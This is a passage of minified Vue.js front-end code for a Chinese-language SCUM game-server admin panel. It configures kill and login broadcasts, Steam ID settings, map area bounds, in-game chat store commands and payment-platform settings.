")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.BanLoginKillNotificationSteamIds?"up":"down"},on:{click:function(){e.$set(e.expander,"BanLoginKillNotificationSteamIds",!e.expander.BanLoginKillNotificationSteamIds)}}},[e._v(e._s(e.expander.BanLoginKillNotificationSteamIds?"隐藏":"显示"))])],1),e.expander.BanLoginKillNotificationSteamIds?e._l(e.settingsForm.BanLoginKillNotificationSteamIds,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("Steam ID:")]),i("a-input",{staticStyle:{width:"calc(100% - 180px)"},attrs:{disabled:!e.edit,placeholder:"请输入Steam ID"},model:{value:t.steamId,callback:function(i){e.$set(t,"steamId",i)},expression:"object.steamId"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.BanLoginKillNotificationSteamIds.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("屏蔽登录:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.banLogin,callback:function(i){e.$set(t,"banLogin",i)},expression:"object.banLogin"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("屏蔽击杀:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.banKill,callback:function(i){e.$set(t,"banKill",i)},expression:"object.banKill"}})],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"自定义击杀播报文案",prop:"DiyLoginKillNotification"}},[i("div",{staticStyle:{width:"100%"}},[i("a-button",{attrs:{size:"small",disabled:!e.edit,icon:"plus"},on:{click:function(){e.settingsForm.DiyLoginKillNotification.push({steamIds:[],enableLogin:!0,loginRawText:"尊敬的VIP{level}级会员【{gesture}】{userName}欢迎新人加入服务器！",enableKill:!0,killRawText:"玩家【{killerName}】在 {area} 区域使用武器【{weapon}】击杀了【{beKilledName}】，距离：{distance}m",forAll:!1})}}},[e._v("添加 ")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.DiyLoginKillNotification?"up":"down"},on:{click:function(){e.$set(e.expander,"DiyLoginKillNotification",!e.expander.DiyLoginKillNotification)}}},[e._v(e._s(e.expander.DiyLoginKillNotification?"隐藏":"显示"))])],1),e.expander.DiyLoginKillNotification?e._l(e.settingsForm.DiyLoginKillNotification,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%","margin-top":"10px",padding:"10px",border:"1px #aaaaaa dashed","border-radius":"4px"}},[i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("启用登陆文案:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.enableLogin,callback:function(i){e.$set(t,"enableLogin",i)},expression:"object.enableLogin"}}),i("a-button",{staticStyle:{float:"right",transform:"translateY(7px)"},attrs:{disabled:!e.edit,icon:"delete",type:"danger",size:"small"},on:{click:function(){e.settingsForm.DiyLoginKillNotification.splice(a,1)}}},[e._v("移除")])],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("登陆文案")]),i("a-tooltip",{attrs:{placement:"left",title:"{level}: 等级 {gesture}: 称号 {userName}: 商城/服务器用户名"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit||!t.enableLogin},model:{value:t.loginRawText,callback:function(i){e.$set(t,"loginRawText",i)},expression:"object.loginRawText"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("启用击杀文案:")]),i("a-switch",{attrs:{disabled:!e.edit},model:{value:t.enableKill,callback:function(i){e.$set(t,"enableKill",i)},expression:"object.enableKill"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[i("span",[e._v("击杀文案")]),i("a-tooltip",{attrs:{placement:"left",title:"{killerName}: 击杀者商城/服务器用户名 {area}: 地图区域 {weapon}: 击杀武器 {beKilledName}: 被击杀者商城/服务器用户名 {distance}: 距离"}},[i("a-icon",{staticStyle:{"margin-left":"5px",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1),i("span",[e._v(":")])],1),i("a-input",{staticStyle:{width:"calc(100% - 100px)"},attrs:{disabled:!e.edit||!t.enableKill},model:{value:t.killRawText,callback:function(i){e.$set(t,"killRawText",i)},expression:"object.killRawText"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"130px","text-align":"right","padding-right":"10px"}},[e._v("适用Steam ID集合:")]),i("a-select",{staticStyle:{width:"calc(100% - 130px)"},attrs:{mode:"tags",disabled:!e.edit||!0===t.forAll},model:{value:t.steamIds,callback:function(i){e.$set(t,"steamIds",i)},expression:"object.steamIds"}})],1),i("div",[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right","padding-right":"10px"}},[e._v("适用全体玩家:")]),i("a-switch",{attrs:{disabled:!e.edit},on:{change:function(e){!0===e&&(t.steamIds=[])}},model:{value:t.forAll,callback:function(i){e.$set(t,"forAll",i)},expression:"object.forAll"}})],1)])})):e._e()],2),i("a-form-model-item",{attrs:{label:"服务器每日重启时间(HH:mm)",prop:"ServerRestartTimeEachDay"}},[i("a-select",{attrs:{mode:"tags",disabled:!e.edit},model:{value:e.settingsForm.ServerRestartTimeEachDay,callback:function(t){e.$set(e.settingsForm,"ServerRestartTimeEachDay",t)},expression:"settingsForm.ServerRestartTimeEachDay"}})],1),i("a-form-model-item",{attrs:{label:"商店机器人的Steam ID",prop:"StoreRobotSteamId",rules:{required:!0,trigger:"change",message:"请输入商店机器人的Steam ID(17位数字)",validator:function(t,i,a){i&&i.length&&/^\d{17}$/.test(i)?a():a(new e.Error("请输入商店机器人的Steam ID(17位数字)"))}}}},[i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.StoreRobotSteamId,callback:function(t){e.$set(e.settingsForm,"StoreRobotSteamId",t)},expression:"settingsForm.StoreRobotSteamId"}})],1),i("a-form-model-item",{attrs:{label:"商店机器人的游戏昵称",prop:"StoreRobotScumName",rules:{required:!0,trigger:"change",message:"请输入商店机器人的游戏昵称",validator:function(t,i,a){i&&i.length?a():a(new e.Error("请输入商店机器人的游戏昵称"))}}}},[i("a-input",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.StoreRobotScumName,callback:function(t){e.$set(e.settingsForm,"StoreRobotScumName",t)},expression:"settingsForm.StoreRobotScumName"}})],1),i("a-form-model-item",{attrs:{prop:"EnableSignUpSteamIdValidation"}},[i("template",{slot:"label"},[i("span",[e._v("开启注册Steam ID防护")]),i("a-tooltip",{attrs:{placement:"left",title:"一般在获取登陆日志之后开启，目前建议Nitrado服务器不要开启"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableSignUpSteamIdValidation,callback:function(t){e.$set(e.settingsForm,"EnableSignUpSteamIdValidation",t)},expression:"settingsForm.EnableSignUpSteamIdValidation"}})],2),i("a-form-model-item",{attrs:{label:"阻止联办名单注册",prop:"NoScumBanSignin"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.NoScumBanSignin,callback:function(t){e.$set(e.settingsForm,"NoScumBanSignin",t)},expression:"settingsForm.NoScumBanSignin"}})],1),i("a-form-model-item",{attrs:{prop:"EnableScumBanServerWarning"}},[i("template",{slot:"label"},[i("span",[e._v("开启联办名单进服警告")]),i("a-tooltip",{attrs:{placement:"left",title:"每隔十五分钟会通报一次服务器内的被联办玩家情况"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableScumBanServerWarning,callback:function(t){e.$set(e.settingsForm,"EnableScumBanServerWarning",t)},expression:"settingsForm.EnableScumBanServerWarning"}})],2),i("a-form-model-item",{attrs:{label:"阻止注册/进服警告的条件",prop:"NoScumBanSigninLimit"}},[i("span",[e._v("被举报次数 ≥")]),i("a-input-number",{staticStyle:{"margin-left":"5px"},attrs:{disabled:!e.edit,precision:0,min:1},model:{value:e.settingsForm.NoScumBanSigninLimit,callback:function(t){e.$set(e.settingsForm,"NoScumBanSigninLimit",t)},expression:"settingsForm.NoScumBanSigninLimit"}})],1),i("a-form-model-item",{attrs:{prop:"AutoRenameRegisteredPlayers"}},[i("template",{slot:"label"},[i("span",[e._v("玩家注册后自动改名")]),i("a-tooltip",{attrs:{placement:"left",title:"根据玩家注册的名字去修改游戏中的名字，需要配合新版机器人软件使用"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.AutoRenameRegisteredPlayers,callback:function(t){e.$set(e.settingsForm,"AutoRenameRegisteredPlayers",t)},expression:"settingsForm.AutoRenameRegisteredPlayers"}})],2),i("a-form-model-item",{attrs:{label:"地图边界信息",prop:"GameMapBorderInfo",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"请输入正确的地图边界信息",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&"number"==typeof i.xMax&&"number"==typeof i.xMin&&"number"==typeof i.yMax&&"number"==typeof i.yMin&&i.xMax>i.xMin&&i.yMax>i.yMin||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("请输入正确的地图边界信息"))}}}},[i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right"}},[e._v("X轴最大值:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 110px)","margin-left":"10px"},attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.GameMapBorderInfo.xMax,callback:function(t){e.$set(e.settingsForm.GameMapBorderInfo,"xMax",t)},expression:"settingsForm.GameMapBorderInfo.xMax"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right"}},[e._v("X轴最小值:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 110px)","margin-left":"10px"},attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.GameMapBorderInfo.xMin,callback:function(t){e.$set(e.settingsForm.GameMapBorderInfo,"xMin",t)},expression:"settingsForm.GameMapBorderInfo.xMin"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right"}},[e._v("Y轴最大值:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 110px)","margin-left":"10px"},attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.GameMapBorderInfo.yMax,callback:function(t){e.$set(e.settingsForm.GameMapBorderInfo,"yMax",t)},expression:"settingsForm.GameMapBorderInfo.yMax"}})],1),i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"100px","text-align":"right"}},[e._v("Y轴最小值:")]),i("a-input-number",{staticStyle:{width:"calc(100% - 110px)","margin-left":"10px"},attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.GameMapBorderInfo.yMin,callback:function(t){e.$set(e.settingsForm.GameMapBorderInfo,"yMin",t)},expression:"settingsForm.GameMapBorderInfo.yMin"}})],1)]),i("a-form-model-item",{attrs:{label:"地图图像文件URL",prop:"GameMapImageUrl",rules:{required:e.userInfo&&"sysAdmin"===e.userInfo.role,trigger:"change",message:"请输入地图图像文件URL",validator:function(t,i,a){e.userInfo&&"sysAdmin"===e.userInfo.role&&i&&i.length||!e.userInfo||"sysAdmin"!==e.userInfo.role?a():a(new e.Error("请输入地图图像文件URL"))}}}},[i("image-select",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role),"show-upload-config":e.showUploadConfig,value:e.settingsForm.GameMapImageUrl},on:{"change-show-upload-config":function(t){e.showUploadConfig=t},change:function(t){e.$set(e.settingsForm,"GameMapImageUrl",t),e.$nextTick((function(){e.$refs.settingsForm.validate()}))}}})],1),i("a-form-model-item",{attrs:{"label-col":{span:7},"wrapper-col":{span:17},label:"游戏地图各区域坐标边界",prop:"GameAreaRanges",rules:{required:!0,trigger:"change",message:"请输入正确的游戏地图各区域坐标边界",validator:function(t,i,a){void 0===Object.keys(i).find((function(e){return null===i[e].xMax||null===i[e].xMin||null===i[e].yMax||null===i[e].yMin||i[e].xMax<i[e].xMin||i[e].yMax<i[e].yMin}))?a():a(new e.Error("请输入正确的游戏地图各区域坐标边界"))}}}},[i("div",{staticStyle:{width:"100%"}},[i("a-popover",{attrs:{placement:"right",visible:e.showAddGameAreaRangeZone,trigger:"click"}},[i("div",{staticStyle:{width:"320px"},attrs:{slot:"title"},slot:"title"},[i("span",{staticStyle:{"font-weight":"bolder"}},[e._v("新增区域")]),i("span",{staticStyle:{cursor:"pointer"},on:{click:function(){e.showAddGameAreaRangeZone=!1,e.addGameAreaRangeZoneInput=""}}},[i("a-icon",{staticStyle:{color:"#ff4d4f",float:"right",display:"inline-block",transform:"translateY(4px)"},attrs:{type:"close-circle",theme:"filled"}})],1)]),i("div",{staticStyle:{width:"320px"},attrs:{slot:"content"},slot:"content"},[i("div",{staticStyle:{width:"100%",height:"40px"}},[i("div",{staticStyle:{width:"60px","text-align":"right",display:"inline-block"}},[e._v("区域:")]),i("a-input",{staticStyle:{width:"250px",display:"inline-block","margin-left":"10px"},attrs:{disabled:!e.edit||!e.showAddGameAreaRangeZone},model:{value:e.addGameAreaRangeZoneInput,callback:function(t){e.addGameAreaRangeZoneInput=t},expression:"addGameAreaRangeZoneInput"}})],1),i("div",{staticStyle:{width:"100%",height:"40px","margin-top":"10px","text-align":"center"}},[i("a-button",{attrs:{type:"primary",disabled:!e.edit||!e.showAddGameAreaRangeZone},on:{click:e.onAddGameAreaRangesZone}},[e._v("提交")])],1)]),i("a-button",{attrs:{size:"small",disabled:!e.edit||e.showAddGameAreaRangeZone,icon:"plus"},on:{click:function(t){e.showAddGameAreaRangeZone=!0}}},[e._v("添加")])],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:e.expander.GameAreaRanges?"up":"down"},on:{click:function(){e.$set(e.expander,"GameAreaRanges",!e.expander.GameAreaRanges)}}},[e._v(e._s(e.expander.GameAreaRanges?"隐藏":"显示"))])],1),e.expander.GameAreaRanges?i("div",{staticStyle:{width:"calc(100% - 10px)","margin-top":"10px","border-radius":"4px",border:"1px #aaaaaa dashed",padding:"10px"}},[i("div",{staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"10%","text-align":"center"}},[e._v("区域")]),i("span",{staticStyle:{display:"inline-block",width:"17.5%","text-align":"center"}},[e._v("X轴最大值")]),i("span",{staticStyle:{display:"inline-block",width:"17.5%","text-align":"center"}},[e._v("X轴最小值")]),i("span",{staticStyle:{display:"inline-block",width:"17.5%","text-align":"center"}},[e._v("Y轴最大值")]),i("span",{staticStyle:{display:"inline-block",width:"17.5%","text-align":"center"}},[e._v("Y轴最小值")]),i("span",{staticStyle:{display:"inline-block",width:"20%","text-align":"center"}},[e._v("操作")])]),e._l(e.settingsForm.GameAreaRanges,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%"}},[i("span",{staticStyle:{display:"inline-block",width:"10%","text-align":"center"}},[e._v(e._s(a))]),i("a-input-number",{staticStyle:{width:"calc(17.5% - 5px)"},attrs:{disabled:!e.edit||e.showAddGameAreaRangeZone},model:{value:t.xMax,callback:function(i){e.$set(t,"xMax",i)},expression:"GameAreaRange.xMax"}}),i("a-input-number",{staticStyle:{width:"calc(17.5% - 5px)","margin-left":"10px"},attrs:{disabled:!e.edit||e.showAddGameAreaRangeZone},model:{value:t.xMin,callback:function(i){e.$set(t,"xMin",i)},expression:"GameAreaRange.xMin"}}),i("a-input-number",{staticStyle:{width:"calc(17.5% - 5px)","margin-left":"10px"},attrs:{disabled:!e.edit||e.showAddGameAreaRangeZone},model:{value:t.yMax,callback:function(i){e.$set(t,"yMax",i)},expression:"GameAreaRange.yMax"}}),i("a-input-number",{staticStyle:{width:"calc(17.5% - 5px)","margin-left":"10px"},attrs:{disabled:!e.edit||e.showAddGameAreaRangeZone},model:{value:t.yMin,callback:function(i){e.$set(t,"yMin",i)},expression:"GameAreaRange.yMin"}}),i("span",{staticStyle:{display:"inline-block",width:"calc(20% - 10px)","text-align":"center"}},[i("a-button",{attrs:{size:"small",icon:"delete",type:"danger",disabled:!e.edit||e.showAddGameAreaRangeZone},on:{click:function(){return e.removeAddGameAreaRangeZone(a)}}},[e._v("删除")])],1)],1)}))],2):e._e()]),i("a-form-model-item",{attrs:{prop:"SteamAPIToken"}},[i("template",{slot:"label"},[i("span",[e._v("Steam API 密钥")]),i("a-tooltip",{attrs:{placement:"left"}},[i("div",{staticStyle:{width:"500px","overflow-y":"auto"},attrs:{slot:"title"},slot:"title"},[i("div",[e._v("查询玩家Steam信息需要用到")]),i("div",[e._v("打开"),i("a",{attrs:{target:"_blank",href:"https://steamcommunity.com/dev/apikey"}},[e._v("密钥申请页面")])]),i("div",[e._v("登录后按提示操作可获取自己的密钥")])]),i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("a-input",{attrs:{disabled:!e.edit||!(e.userInfo&&"sysAdmin"===e.userInfo.role)},model:{value:e.settingsForm.SteamAPIToken,callback:function(t){e.$set(e.settingsForm,"SteamAPIToken",t)},expression:"settingsForm.SteamAPIToken"}})],2)],2)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"71ceefee",null).exports),Fa=(i("6062"),i("3ca3"),{name:"DollarsSettings",components:{CommandsPicker:_e,Loading:w,ImageSelect:De},computed:Object(s.a)(Object(s.a)({},Object(v.mapState)(["userInfo"])),{},{innerModeFuctionList:function(){var e=this.settingsForm.EnableInnerModeSimpleSignup;return[{function:"signup",cnFunction:"注册用户",example:"玩家在".concat(!0===e?"任意频道":"附近频道或者队友频道","输入").concat(!0===e?'"{text}"<br>例如："{text}"，<br>如根据Steam ID生成的虚拟手机号重复，则需要完整输入"{text} 手机号码 电子邮箱"<br>例如："{text} 13123456789 example@a.com"或"{text} +817012345678 example@b.com"':'"{text} 手机号码 电子邮箱"<br>例如："{text} 13123456789 example@a.com"或"{text} +817012345678 example@b.com"')},{function:"setpassword",cnFunction:"设置商城密码",example:'玩家在任意频道输入"{text} 商城密码"<br>例如："{text} 商城密码"'},{function:"welcomepack",cnFunction:"领取新手礼包",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"welcomedidi",cnFunction:"领取新手滴滴车",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"purchase",cnFunction:"购买商品/套餐",example:'玩家在任意频道输入"{text} 准确商品/套餐名称 数量"<br>例如："{text} 原木 5"'},{function:"sendset",cnFunction:"发送套餐",example:'玩家在任意频道输入"{text} 准确套餐名称"<br>例如："{text} VIP高级套餐"，该命令会优先发放所有符合条件的套餐中领取时间最久远的套餐'},{function:"teleportzone",cnFunction:"地图分区域传送",example:'玩家在任意频道输入"{text} 区域名称"<br>例如："{text} A4"，区域名称中的字母大小写皆可'},{function:"teleporthot",cnFunction:"热点区域传送",example:'玩家在任意频道输入"{text} 热点区域的准确名称"<br>例如："{text} 机场"'},{function:"teleportprivate",cnFunction:"私人传送",example:'玩家在任意频道输入"{text} 私人传送点准确名称"<br>例如："{text} 家"'},{function:"dollarloot",cnFunction:"美金抽奖",example:'玩家在任意频道输入"{text}"<br>例如："{text}"或"{text} 十连抽"'},{function:"itemloot",cnFunction:"物品抽奖",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"getfame",cnFunction:"声望兑换",example:'玩家在任意频道输入"{text} 声望值"<br>例如："{text} 100"'},{function:"transit",cnFunction:"玩家转账",example:'玩家在任意频道输入"{text} 玩家SteamID 商城美金数目"<br>例如："{text} 76561111111111111 2500"'},{function:"monthlyset",cnFunction:"优惠月卡",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"checkin",cnFunction:"每日签到",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"chekinpack",cnFunction:"领取签到礼包",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"achievepack",cnFunction:"领取成就礼包",example:'玩家在任意频道输入"{text} 准确的成就礼包名称"<br>例如："{text} 撬锁数量超过100"'},{function:"lottery",cnFunction:"购买彩票",example:'玩家在任意频道输入"{text} 下注数量 彩票名称 投注号码(仅限竞猜彩票)"<br>例如："{text} 3 日日奖"或"{text} 3 每日猜 3 4 5 6"'},{function:"squad",cnFunction:"队伍管理",example:'玩家在任意频道输入以下类型的行为参数：\n          <br>"{text} 创建 队伍名称"<br>例如："{text} 创建 飞虎队"\n          <br>"{text} 解散"<br>例如："{text} 解散"\n          <br>"{text} 加入 准确队伍名称"<br>例如："{text} 加入 野战队"\n          <br>"{text} 批准加入 准确玩家名字"<br>例如："{text} 批准加入 灰马"\n          <br>"{text} 退出"<br>例如："{text} 退出"\n          <br>"{text} 踢出 准确玩家名字"<br>例如："{text} 踢出 老6"\n          <br>"{text} 任命副队长 准确玩家名字"<br>例如："{text} 任命副队长 法slave"\n          <br>"{text} 解除副队长 准确玩家名字"<br>例如："{text} 解除副队长 陈小猪"\n          <br>"{text} 转让队长 准确玩家名字"<br>例如："{text} 转让队长 黑木"\n          '},{function:"teleportsquad",cnFunction:"队伍传送",example:'玩家在任意频道输入"{text} 准确玩家名字"<br>例如："{text} 微国宝"'},{function:"squadgather",cnFunction:"梁山好汉",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'},{function:"bountyhunter",cnFunction:"赏金猎人",example:'玩家在任意频道输入"{text} 准确玩家名字 悬赏金额"<br>例如："{text} 海盗 5000"'},{function:"joinhunter",cnFunction:"领取猎人任务",example:'玩家在任意频道输入"{text} 准确的被悬赏玩家名字"<br>例如："{text} 盗海"'},{function:"exithunter",cnFunction:"退出猎人任务",example:'玩家在任意频道输入"{text} 准确的被悬赏玩家名字"<br>例如："{text} 淮不安逸"'},{function:"lhd",cnFunction:"比大小",example:'玩家在任意频道输入"{text} 龙/虎/豹/和 打赌金额"<br>例如："{text} 和 2000"'},{function:"recycleitem",cnFunction:"物品回收",example:'玩家在任意频道输入"{text} 回收类型 回收数量"<br>例如："{text} yoki的头颅 3"'},{function:"claimmilitary",cnFunction:"兑换军衔",example:'玩家在任意频道输入"{text} 准确的军衔名称 天数数字/永久"<br>例如："{text} 将军 7"或"{text} 3 将军 永久"'},{function:"specialgodmode",cnFunction:"购买建家权限",example:'玩家在任意频道输入"{text} 时长（分钟）"<br>例如："{text} 60"'},{function:"serverstatus",cnFunction:"查询在线人数",example:'玩家在任意频道输入"{text}"<br>例如："{text}"'}]}}),data:function(){var e=this;return{moment:R.a,window:window,purchaseLimitEachKeyValue:{second:"每秒",minute:"每分钟",hour:"每小时",day:"每日(24小时)",day_start:"每日(0时起)",week:"每周(7天)",week_start:"每周(周一起)",month:"每月(30天)",month_start:"每月(1号起)",once:"永久"},claimLimitEachKeyValue:{day:"每日(0时起)",week:"每周(周一起)",month:"每月(1号起)",once:"永久"},achieveTypeKeyValue:{npcPurchase:"NPC商城购买金额",npcSell:"NPC商城卖出金额",countLoginMinutes:"玩家累计登陆游戏时长",usedDollar:"商城消费金额",lockPickTime:"撬锁成功次数",lockPickUsedTime:"撬锁成功最短时间",defusalTime:"剪线成功次数",defusalUsedTime:"剪线成功最短时间",successOvertakeTime:"夺取领地旗次数",ArmTrapTime:"安装陷阱次数",TriggerTrapTime:"触发陷阱次数"},lockTypeKeyValue:{basic:"基础",medium:"中等",advanced:"高级"},Error:Error,show:!1,loading:!1,edit:!1,saveLoading:!1,levelList:[],militaryLevelList:[],settingsForm:{DollarPerRmb:null,ChargePayPid:"",ChargePayKey:"",ChargePayAPI:"",AdvancedUserChargeConfigs:[],EnableInnerMode:!1,EnableInnerModeSimpleSignup:!0,InnerModeConfigs:[],InnerModeShortCutConfigs:[],InnerModeDiyFaqConfigs:[],ThirdPartyRobotUidConfigs:[],ThirdPartyRobotAuthConfigs:"",UserCheckInPrize:"",FamesPrice:"",TransitionFeePercent:"",EnableKill2LoginDollars:!0,EnableSafeZoneKillPunish:!0,SafeAreaKillPunishmentMode:0,KillerReward:null,VictimPunishment:null,MinRewardOnlineTime:null,OnlineRewardPerMinute:null,MaxOnlineReward:null,EnableSignupAutoDollars:!1,SignupAutoDollars:null,GetPrizePrice:null,GetPrizePrice10:null,MessagePricePerLine:null,TeamMaxMembers:null,EnableTransferGameDollarToStoreDollar:!1,TransferGameDollarToStoreDollarAccountID:"",TransferGameDollarToStoreDollarPercent:1,EnableStarterPlayerWelcome:!1,EnableTeleportStarterPlayerToTargetPlace:!1,TeleportStarterPlayerToTargetPlaceLocation:"",TeleportStarterPlayerToTargetPlaceDelay:null,EnableVehicleEnsurance:!1,VehicleEnsuranceConfigs:[],HotPointTeleportPoint:[],UserMonitorsConfig:{robots:[],locations:[]},HotZoneTeleportFreeTimes:null,StoreLuckyPrizeControl:"",EnablePurcahseAddMembershipPoints:!0,EnableNonVipGainPurchasePoint:!0,EnableCharge:!0,EnableLoginSetEveryday:!0,EnableNDayGift:!1,EnableLottery:!1,EnableAchieveGift:!1,EnableFamePurchase:!0,EnableGameMessage:!0,EnableGetPrize:!0,EnableTransition:!0,EnableWelcomePackBuy:!0,EnableWelcomeDidiVehicleBuy:!0,EnableMapSelectLocation:!0,EnableTeamTeleport:!0,EnableSquadGather:!0,EnableUserLocationBuy:!0,EnableGameSetFakeName:!0,EnablePurchaseMultiItem:!0,EnableQueuePurchase:!0,EnableVipPriority:!0,EnableRealtimeKillRecord:!0,EnableRealtimeChatMessageRecord:!0,EnableRealtimeAdminCommandRecord:!0,EnableRealtimeViolationsRecordRecord:!0,EnableShowKillMap:!0,EnableUserMonitors:!0,EnableTeleportPlayerToEquipedTrap:!1,EnableRandomPrizeDollarPurchase:!1,EnableAutoFetchVehicleIdList:!1,EnableAutoFetchPlayerLocationList:!1,RandomPrizePrice:null,RandomPrizePrice10:null,LoginSetClaimCDType:"24h",CheckInCDType:"24h",DiDiVehicleCDType:"0am",StoreRandomPrizePool:[],NDayGiftConfig:[],NDayGiftFeeConfigs:[],LotteryConfigs:[],AchieveGiftConfigs:[],BuyArtifactRightMonitor:[],EnableAllBuy:!0,EnableLocationExpose:!1,AutoRenameRegisteredPlayers:!1,EnableAutoAsyncServerAdminSteamIdConfigs:!1,ServerAdminSteamIdConfigsPath:"",ServerAdminSteamIdConfigsContent:[],EnableBuyGodmode:!1,EnableIllegalAdminCommandPunishment:!1,IllegalAdminCommandPunishmentType:1,AsyncServerAdminSteamIdConfigsRecord:{recentTimeStamp:"",result:""},LHDConfigs:{minPrice:0,dragonWinMultiples:0,tigerWinMultiples:0,leopardWinMultiples:0,equalWinMultiples:0,equalDeductMultiples:0},MilitaryLevelConfigs:[],ResourceRecycleConfigs:[],TeleportLimitaions:[]},settingsFormRules:{DollarPerRmb:[{required:!0,trigger:"change",message:"请输入每一元能兑换的美金数额",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入每一元能兑换的美金数额"))}}],ChargePayPid:[{required:!0,trigger:"change",message:"请输入充值平台PID",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入充值平台PID"))}}],ChargePayKey:[{required:!0,trigger:"change",message:"请输入充值平台KEY",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入充值平台KEY"))}}],ChargePayAPI:[{required:!0,trigger:"change",message:"请输入充值平台跳转地址",validator:function(e,t,i){(null==t?void 0:t.length)>0?i():i(new Error("请输入充值平台跳转地址"))}}],AdvancedUserChargeConfigs:[{required:!0,trigger:"change",message:"请正确配置仅充值购买套餐",validator:function(t,i,a){try{if(i&&i.length){var n,r=[],o={},s=Object(we.a)(i);try{for(s.s();!(n=s.n()).done;){var l=n.value;o[l.typeGroup]=o[l.typeGroup]?o[l.typeGroup]+1:1}}catch(e){s.e(e)}finally{s.f()}i.forEach((function(t,i){var a={line:i+1,contents:[]};if(o[t.typeGroup]>1&&a.contents.push("分类标记不能重复"),t.typeGroup&&t.typeGroup.length>0||a.contents.push("分类标记不能为空"),t.desc&&t.desc.length>0||a.contents.push("描述不能为空"),"number"==typeof t.price&&t.price>0||a.contents.push("价格必须大于0"),!0===t.check.dollar&&("number"!=typeof t.dollar||t.dollar<0)&&a.contents.push("美金金额不能为空且应≥0"),!0===t.check.vip&&(e.levelList&&e.levelList.length&&void 0!==e.levelList.find((function(e){return e===t.vip.level}))?("number"!=typeof 